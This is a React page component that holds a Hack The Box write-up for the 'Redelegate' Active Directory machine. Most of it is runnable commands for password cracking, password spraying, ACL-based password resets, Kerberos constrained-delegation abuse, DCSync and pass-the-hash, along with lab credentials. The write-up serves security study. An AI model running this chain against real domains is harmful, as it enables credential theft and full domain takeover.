import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { FaArrowLeft, FaCalendar, FaServer, FaStar, FaDesktop, FaNetworkWired, FaCopy, FaCheck } from 'react-icons/fa';
import TableOfContents from '../../../components/TableOfContents';
import InfoStatus from '../../../components/InfoStatus';
import ScrollToTop from '../../../components/ScrollToTop';
import DynamicSEO from '../../../components/DynamicSEO';
import './RedelegateWalkthrough.css';

const RedelegateWalkthrough = () => {
  const navigate = useNavigate();

  // CodeBlock component for terminal-like code blocks
  const CodeBlock = ({ language, children }) => {
    const [copied, setCopied] = useState(false);
    
    const handleCopy = async () => {
      try {
        await navigator.clipboard.writeText(children);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy text: ', err);
      }
    };

    const displayLanguage = language === 'bash' ? 'Shell' : language;
    const showPrompt = language === 'bash' || language === 'shell';

    return (
      <div className="code-block-container">
        <div className="code-block-header">
          <span className="code-block-language">{displayLanguage || 'Terminal'}</span>
          <button 
            className={'copy-button ' + (copied ? 'copied' : '')}
            onClick={handleCopy}
            title={copied ? 'Copied!' : 'Copy to clipboard'}
          >
            {copied ? <FaCheck /> : <FaCopy />}
          </button>
        </div>
        <pre>
          <code className={'terminal-code ' + (language ? 'language-' + language : '')}>
            {showPrompt && <span className="terminal-prompt">$ </span>}
            {children}
          </code>
        </pre>
      </div>
    );
  };

  // Function to parse inline markdown (bold, italic, inline code, links)
  const parseInlineMarkdown = (text) => {
    const parts = [];
    let lastIndex = 0;
    let key = 0;
    
    // Regex to match [text](url), **bold**, *italic*, and `code`
    const regex = /(\[.*?\]\(.*?\)|\*\*.*?\*\*|\*.*?\*|`.*?`)/g;
    let match;
    
    while ((match = regex.exec(text)) !== null) {
      // Add text before the match
      if (match.index > lastIndex) {
        parts.push(text.substring(lastIndex, match.index));
      }
      
      const matched = match[0];
      
      if (matched.startsWith('[') && matched.includes('](')) {
        // Link [text](url)
        const linkMatch = matched.match(/\[(.*?)\]\((.*?)\)/);
        if (linkMatch) {
          const [, linkText, linkUrl] = linkMatch;
          parts.push(
            <a key={key++} href={linkUrl} target="_blank" rel="noopener noreferrer" className="content-link">
              {linkText}
            </a>
          );
        }
      } else if (matched.startsWith('**') && matched.endsWith('**')) {
        // Bold text
        parts.push(<strong key={key++}>{matched.slice(2, -2)}</strong>);
      } else if (matched.startsWith('*') && matched.endsWith('*')) {
        // Italic text
        parts.push(<em key={key++}>{matched.slice(1, -1)}</em>);
      } else if (matched.startsWith('`') && matched.endsWith('`')) {
        // Inline code
        parts.push(<code key={key++} className="inline-code">{matched.slice(1, -1)}</code>);
      }
      
      lastIndex = regex.lastIndex;
    }
    
    // Add remaining text
    if (lastIndex < text.length) {
      parts.push(text.substring(lastIndex));
    }
    
    return parts.length > 0 ? parts : text;
  };

  // Redelegate data
    const writeup = {
    id: 'redelegate-walkthrough',
    title: 'Redelegate Walkthrough',
    excerpt: 'Redelegate is a hard difficulty Windows Active Directory machine. Anonymous FTP access exposes a KeePass database and password pattern hints, which are cracked with hashcat. MSSQL guest credentials found in KeePass allow RID brute-forcing to enumerate domain users. Password spraying with a seasonal pattern yields credentials for Marie.Curie, whose Helpdesk group membership grants ForceChangePassword on all users. BloodHound reveals that Helen.Frost (IT group) has GenericAll on FS01$ and WinRM access to the DC. Combined with SeEnableDelegationPrivilege, constrained delegation is configured on FS01$ to impersonate a Domain Admin via S4U2Self/S4U2Proxy, bypassing the Administrator sensitive flag to achieve DCSync and full domain compromise.',
    date: 'Aug 06, 2026',
    tags: ['Htb', 'Vulnlab', 'Ad', 'Windows', 'Smb', 'FTP', 'MSSQL', 'KeePass', 'Password-Cracking', 'Password-Spraying', 'KCD', 'Dcsync', 'Kerberos'],
    difficulty: 'Hard',
    os: 'Windows',
    ip: '10.129.45.145',
    content: `## Overview
Redelegate is a **hard** difficulty Windows Active Directory machine from **Hack The Box** (originally from **Vulnlab**). The attack begins with anonymous FTP access that exposes a KeePass database and documents hinting at a \`SeasonYear!\` password pattern. Cracking the KeePass database reveals MSSQL guest credentials, which allow RID brute-forcing to enumerate all domain users. Password spraying with the seasonal pattern \`Fall2024!\` yields credentials for \`Marie.Curie\`, whose membership in the Helpdesk group grants **ForceChangePassword** over all users. BloodHound analysis reveals the full attack path: \`Helen.Frost\` (IT group) has **GenericAll** on the \`FS01$\` computer object and WinRM access to the DC. Helen also holds **SeEnableDelegationPrivilege**, which allows configuring Kerberos constrained delegation on \`FS01$\`. By impersonating a non-protected Domain Admin (\`Ryan.Cooper\`) via S4U2Self/S4U2Proxy, a service ticket for CIFS on the DC is obtained, enabling DCSync to dump all domain hashes and achieve full domain compromise.

## Enumeration

### Port Scanning
Running \`Nmap\` port scanner to enumerate the services running on the target machine. The scan reveals several critical ports typical of a Windows Active Directory Domain Controller, including FTP (21), DNS (53), HTTP (80), Kerberos (88), LDAP (389, 636, 3268, 3269), SMB (445), MSSQL (1433), RDP (3389), and WinRM (5985):
\`\`\`bash
sudo nmap -sS -sV -sC -Pn -n -p- -vv --min-rate=10000 10.129.45.145 -oN nmap/1.nmap

PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 Microsoft ftpd
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: redelegate.vl)
445/tcp   open  microsoft-ds? syn-ack ttl 127
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
\`\`\`

We can see some important open ports:
• **Port 21**: FTP service with Anonymous login allowed
• **Port 53**: DNS service running Simple DNS Plus
• **Port 80**: HTTP service running Microsoft IIS httpd 10.0
• **Port 88**: Kerberos authentication service
• **Port 135**: Microsoft Windows RPC service
• **Port 139**: NetBIOS service
• **Port 389**: LDAP service running Microsoft Windows Active Directory LDAP (Domain: redelegate.vl)
• **Port 445**: SMB service
• **Port 1433**: MSSQL service running Microsoft SQL Server 2019 RTM
• **Port 3389**: RDP service (Microsoft Terminal Services)
• **Port 5985**: WinRM service (HTTP)

Adding domains into hosts file.
\`\`\`bash
echo "10.129.45.145 redelegate.vl dc.redelegate.vl" | sudo tee -a /etc/hosts
\`\`\`

### FTP - Anonymous Access
FTP allows anonymous login, exposing three files: a cyber audit report, a KeePass database, and a training agenda. It is important to switch to \`binary\` mode before downloading the \`.kdbx\` file to avoid corruption:
\`\`\`bash
ftp 10.129.45.145
\`\`\`
![FTP anonymous access showing three exposed files](/images/writeups/redelegate/1.png)

\`CyberAudit.txt\` reveals audit findings about weak passwords, excessive privileges, unused AD objects, and dangerous ACLs. Some remediation is still IN PROGRESS.

\`TrainingAgenda.txt\` contains a critical hint about password patterns. The training session titled "Weak Passwords" discusses why \`SeasonYear!\` is not a good password, which tells us the exact pattern being used in the environment:
![TrainingAgenda.txt revealing the SeasonYear! password pattern](/images/writeups/redelegate/2.png)

### KeePass - Hash Extraction & Cracking
With the \`Shared.kdbx\` file in hand, the next step is extracting the hash using [keepass2john](https://github.com/ivanmrsulja/keepass2john/blob/master/keepass2john.py):
\`\`\`bash
python3 keepass2john.py Shared.kdbx
\`\`\`
![keepass2john extracting the hash from Shared.kdbx](/images/writeups/redelegate/3.png)

The hash format for hashcat mode \`13400\` (KeePass) requires removing the \`Shared:\` prefix. Based on the \`TrainingAgenda.txt\` hint (\`SeasonYear!\` pattern), a custom wordlist is generated combining season/month names with years and common suffixes:
\`\`\`python
seasons = ['Spring', 'Summer', 'Autumn', 'Fall', 'Winter',
           'January', 'February', 'March', 'April', 'May', 'June',
           'July', 'August', 'September', 'October', 'November', 'December']

suffixes = ['!', '@', '#', '$', '%', '&', '*', '.', '!!', '@!', '#!', '1!', '123',
            '1', '12', '01', '?', '!?', '']

with open('season_wordlist.txt', 'w') as f:
    for s in seasons:
        for y in range(2018, 2027):
            for yr in [str(y), str(y)[2:]]:
                for case in [s, s.lower(), s.upper(), s.swapcase()]:
                    for suffix in suffixes:
                        f.write(f'{case}{yr}{suffix}\\n')
                        f.write(f'{case}_{yr}{suffix}\\n')
                        f.write(f'{case}-{yr}{suffix}\\n')
                        f.write(f'{yr}{case}{suffix}\\n')
\`\`\`

Running hashcat with the generated wordlist cracks the database:
\`\`\`bash
hashcat -m 13400 kpasshash season_wordlist.txt
\`\`\`
![hashcat cracking the KeePass database password](/images/writeups/redelegate/4.png)

### KeePass Contents
Opening the KeePass database with the cracked password reveals MSSQL credentials stored inside:
![KeePass database revealing MSSQL credentials for SQLGuest](/images/writeups/redelegate/5.png)

### MSSQL - Password Spraying & RID Enumeration
With the MSSQL credentials from KeePass, a password spray confirms which accounts are valid against the service:
\`\`\`bash
nxc mssql 10.129.45.145 -u users.txt -p pass.txt --continue-on-success --local-auth
\`\`\`
![MSSQL password spray results](/images/writeups/redelegate/6.png)

Connecting to MSSQL as \`SQLGuest\` confirms the access:
\`\`\`bash
mssqlclient.py sqlguest:zDPBpaF4FywlqIv11vii@10.129.45.145
\`\`\`
![mssqlclient connection as SQLGuest](/images/writeups/redelegate/7.png)

Even as guest, we can enumerate domain users via **RID brute force** through MSSQL. This works because MSSQL can translate SIDs to usernames using \`SUSER_SNAME()\`, and netexec automates this:
\`\`\`bash
netexec mssql 10.129.45.145 -u SQLGuest -p zDPBpaF4FywlqIv11vii --rid-brute
\`\`\`
![RID brute force through MSSQL enumerating domain users](/images/writeups/redelegate/8.png)

Extracting just the usernames from the output:
\`\`\`bash
cat msusers.txt | awk -F '\\\\' '{print $2}'
\`\`\`
![Extracted domain usernames list](/images/writeups/redelegate/9.png)

### SMB - Password Spraying with Season Pattern
Using the password pattern from \`TrainingAgenda.txt\`, spraying \`Fall2024!\` against all enumerated users:
\`\`\`bash
nxc smb 10.129.45.145 -u mssqusers.txt -p 'Fall2024!' --continue-on-success --no-bruteforce
\`\`\`
![SMB password spray revealing Marie.Curie with Fall2024!](/images/writeups/redelegate/10.png)

\`Marie.Curie\` authenticates with \`Fall2024!\`. Enumerating shares with the new credentials:
\`\`\`bash
nxc smb 10.129.45.145 -u Marie.Curie -p 'Fall2024!' --shares
\`\`\`
![Marie.Curie share enumeration](/images/writeups/redelegate/11.png)

### BloodHound - AD Enumeration
Collecting AD data with bloodhound-python to map the domain structure and identify attack paths:
\`\`\`bash
bloodhound-python -u Marie.Curie -p 'Fall2024!' -d redelegate.vl -ns 10.129.45.145 -dc DC.redelegate.vl -c All --zip
\`\`\`
![bloodhound-python collecting AD data](/images/writeups/redelegate/12.png)

BloodHound reveals the complete attack path:
• \`Marie.Curie\` is a member of the \`Helpdesk\` group
• \`Helpdesk\` has **ForceChangePassword** on all users (inherited ACL)
• \`Helen.Frost\` is a member of the \`IT\` group
• \`IT\` group has **GenericAll** on \`FS01$\` (computer object)
• \`Helen.Frost\` has **PSRemote** access to the DC (WinRM)

![BloodHound showing the attack path from Marie.Curie to Domain Admin](/images/writeups/redelegate/13.png)

![BloodHound expanded view showing GenericAll on FS01$ and PSRemote on DC](/images/writeups/redelegate/14.png)

## Foothold

### User Flag - ForceChangePassword + WinRM
Since \`Marie.Curie\` (Helpdesk) has \`ForceChangePassword\` on users, we can reset \`Helen.Frost\`'s password. This ACL allows changing the target's password without knowing the current one:
\`\`\`bash
bloodyAD -d DC.redelegate.vl -H 10.129.45.145 -u Marie.Curie -p 'Fall2024!' set password HELEN.FROST P@ssw0rd!
\`\`\`
![bloodyAD resetting Helen.Frost password via ForceChangePassword](/images/writeups/redelegate/15.png)

\`Helen.Frost\` has WinRM access to the DC (member of Remote Management Users). Connecting and grabbing the user flag:
\`\`\`bash
evil-winrm -i 10.129.45.145 -u Helen.Frost -p 'P@ssw0rd!'
\`\`\`
![evil-winrm shell as Helen.Frost with user flag](/images/writeups/redelegate/16.png)

## Privilege Escalation

### Constrained Delegation Abuse
Checking privileges on Helen.Frost's session reveals **SeEnableDelegationPrivilege**:
\`\`\`powershell
whoami /priv
\`\`\`
![whoami /priv showing SeEnableDelegationPrivilege](/images/writeups/redelegate/17.png)

This is a User Right Assignment (from GPO, not visible in BloodHound/LDAP) that allows configuring Kerberos delegation on computer/user accounts. Combined with **GenericAll** on FS01$ (from IT group membership), this opens the path to constrained delegation abuse.

The key distinction here is that **GenericAll** alone lets you write any LDAP attribute on the object (password reset, SPN changes, etc.), but for delegation attributes (\`msDS-AllowedToDelegateTo\`, \`TRUSTED_TO_AUTH_FOR_DELEGATION\` flag), the DC enforces an additional check: the caller must also have **SeEnableDelegationPrivilege**. Without it, writing these specific attributes returns Access Denied even with full object control.
![SeEnableDelegationPrivilege confirmation](/images/writeups/redelegate/18.png)

### Resetting FS01$ and Configuring Delegation
Since we have **GenericAll** on \`FS01$\`, the first step is resetting the computer account password to take control of it:
\`\`\`bash
bloodyAD -d redelegate.vl --host 10.129.45.145 -u 'Helen.Frost' -p 'P@ssw0rd!' set password 'FS01$' 'NewPass123!'
\`\`\`

With the password reset, we can now configure constrained delegation on \`FS01$\`. Setting \`msDS-AllowedToDelegateTo\` to point at the DC's CIFS service tells the KDC that \`FS01$\` is allowed to request service tickets to \`cifs/dc.redelegate.vl\` on behalf of other users (S4U2Proxy):
\`\`\`bash
bloodyAD -d redelegate.vl --host 10.129.45.145 -u 'Helen.Frost' -p 'P@ssw0rd!' set object 'FS01$' msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'
\`\`\`
![Constrained delegation configured on FS01$ pointing to cifs/dc.redelegate.vl](/images/writeups/redelegate/19.png)

The next piece is enabling **Protocol Transition** by setting \`userAccountControl\` to \`16781312\`, which is \`WORKSTATION_TRUST_ACCOUNT (0x1000)\` + \`TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000)\`. This allows \`FS01$\` to obtain a service ticket for itself on behalf of any user (S4U2Self), even without that user authenticating first:
\`\`\`bash
bloodyAD -d redelegate.vl --host 10.129.45.145 -u 'Helen.Frost' -p 'P@ssw0rd!' set object 'FS01$' userAccountControl -v 16781312
\`\`\`
![userAccountControl set to enable TRUSTED_TO_AUTH_FOR_DELEGATION](/images/writeups/redelegate/20.png)

To summarize how the S4U chain works: first, \`FS01$\` asks the KDC for a service ticket to itself claiming a user authenticated to it (S4U2Self), and the KDC issues a forwardable ticket. Then, \`FS01$\` presents that ticket and asks for a new ticket to \`cifs/dc.redelegate.vl\` as that user (S4U2Proxy). Since \`msDS-AllowedToDelegateTo\` includes this SPN, the KDC grants it, giving us a valid Kerberos ticket for CIFS on the DC as a Domain Admin.

### Impersonating a Domain Admin
With the delegation configured, the first attempt targets the \`Administrator\` account, but it fails with \`KDC_ERR_BADOPTION\`:
\`\`\`bash
getST.py -spn cifs/dc.redelegate.vl -impersonate Administrator -dc-ip 10.129.45.145 'redelegate.vl/FS01$:NewPass123!'
\`\`\`
![getST.py failing with KDC_ERR_BADOPTION for Administrator](/images/writeups/redelegate/21.png)

This happens because \`Administrator\` has **"Account is sensitive and cannot be delegated"** (\`Marked Sensitive: TRUE\` in BloodHound). The KDC refuses to issue delegated tickets for protected accounts:
![BloodHound showing Administrator Marked Sensitive: TRUE](/images/writeups/redelegate/22.png)

![Administrator account sensitive flag detail](/images/writeups/redelegate/23.png)

However, \`Ryan.Cooper\` is also a **Domain Admin** but does NOT have the sensitive flag set (\`Marked Sensitive: FALSE\`), making him a valid delegation target. Running \`getST.py\` again targeting \`Ryan.Cooper\` succeeds:
\`\`\`bash
getST.py -spn cifs/dc.redelegate.vl -impersonate Ryan.Cooper -dc-ip 10.129.45.145 'redelegate.vl/FS01$:NewPass123!'
\`\`\`
![getST.py successfully impersonating Ryan.Cooper](/images/writeups/redelegate/24.png)

### DCSync & Root
With the impersonated ticket as \`Ryan.Cooper\`, we can now perform a DCSync to dump all domain hashes:
\`\`\`bash
export KRB5CCNAME=Ryan.Cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
secretsdump.py -k -no-pass dc.redelegate.vl -just-dc
\`\`\`
![secretsdump.py performing DCSync and dumping domain hashes](/images/writeups/redelegate/25.png)

Finally, using the Administrator NTLM hash for a pass-the-hash login gives us full access to the DC and the root flag:
\`\`\`bash
evil-winrm -i 10.129.45.145 -u Administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
\`\`\`
![evil-winrm as Administrator with root flag](/images/writeups/redelegate/26.png)

## Conclusion
Redelegate is a hard-difficulty Windows Active Directory machine that demonstrates a realistic enterprise attack chain combining credential discovery, Active Directory enumeration, and advanced Kerberos delegation abuse. The machine showcases how seemingly minor misconfigurations compound into full domain compromise.

The attack path involved:

• **FTP Anonymous Access**: Retrieving a KeePass database and training documents that reveal a \`SeasonYear!\` password pattern
• **KeePass Cracking**: Using hashcat with a custom seasonal wordlist to crack the KeePass database, exposing MSSQL credentials
• **MSSQL RID Brute Force**: Leveraging guest MSSQL access to enumerate all domain users via \`SUSER_SNAME()\` SID-to-name translation
• **Password Spraying**: Spraying \`Fall2024!\` across domain users to find \`Marie.Curie\` still using the weak seasonal pattern
• **BloodHound Analysis**: Mapping the full attack path from \`Marie.Curie\` (Helpdesk - ForceChangePassword) through \`Helen.Frost\` (IT - GenericAll on FS01$, WinRM, SeEnableDelegationPrivilege) to Domain Admin
• **ForceChangePassword**: Resetting \`Helen.Frost\`'s password to gain WinRM access and the user flag
• **Constrained Delegation Abuse**: Resetting \`FS01$\`'s password, configuring \`msDS-AllowedToDelegateTo\` and enabling \`TRUSTED_TO_AUTH_FOR_DELEGATION\` to set up S4U2Self + S4U2Proxy
• **Sensitive Account Bypass**: Discovering that \`Administrator\` has the "sensitive and cannot be delegated" flag, pivoting to \`Ryan.Cooper\` (Domain Admin without the flag)
• **DCSync**: Using the impersonated ticket to dump all domain hashes and achieving full domain compromise via pass-the-hash

**Tools Used**: Nmap, NetExec (nxc), FTP, KeePass2John, Hashcat, mssqlclient.py, BloodHound, bloodyAD, Evil-WinRM, Impacket (getST.py, secretsdump.py)

The machine highlights the risks of anonymous service access, predictable password patterns, overly permissive ACLs (ForceChangePassword on all users), and the dangerous combination of GenericAll with SeEnableDelegationPrivilege. The name "Redelegate" itself is a hint at the constrained delegation abuse required for privilege escalation.
`};

  return (
    <>
      <DynamicSEO 
        type="writeup" 
        data={{
          title: writeup.title,
          excerpt: writeup.excerpt,
          id: writeup.id,
          image_url: '/images/writeups/redelegate/machine.png',
          os_type: writeup.os,
          difficulty: writeup.difficulty,
          tags: writeup.tags
        }} 
      />
      <motion.div 
        className="writeup-detail-page"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>
        
        <motion.div 
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1 id="writeup-title">{writeup.title}</h1>
          
          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>
          
          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS: 
                    <img 
                      src={`/os-icons/${writeup.os}.png`} 
                      alt={`${writeup.os} Icon`} 
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/redelegate/machine.png" alt="Redelegate" className="machine-image" />
          </div>
        </div>
      </div>

          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;
              
              while (i < lines.length) {
                const line = lines[i];
                
                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{parseInlineMarkdown(line.substring(2))}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{parseInlineMarkdown(line.substring(3))}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{parseInlineMarkdown(line.substring(4))}</h3>);
                } else if (line.startsWith('```')) {
                  // Handle code blocks with CodeBlock component
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  
                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('![')) {
                  // Handle images
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.startsWith('<InfoStatus')) {
                  // Handle InfoStatus component
                  const titleMatch = line.match(/title="([^"]*)"/);
                  const messageMatch = line.match(/message="([^"]*)"/);
                  if (titleMatch && messageMatch) {
                    elements.push(
                      <InfoStatus 
                        key={i} 
                        title={titleMatch[1]} 
                        message={messageMatch[1]} 
                      />
                    );
                  }
                } else if (line.trim()) {
                  elements.push(<p key={i}>{parseInlineMarkdown(line)}</p>);
                } else {
                  elements.push(<br key={i} />);
                }
                
                i++;
              }
              
              return elements;
            })()}
          </div>
        </motion.div>
      </div>

      <TableOfContents content={writeup.content} title={writeup.title} />
      
      <ScrollToTop />
      </motion.div>
    </>
  );
};

export default RedelegateWalkthrough;
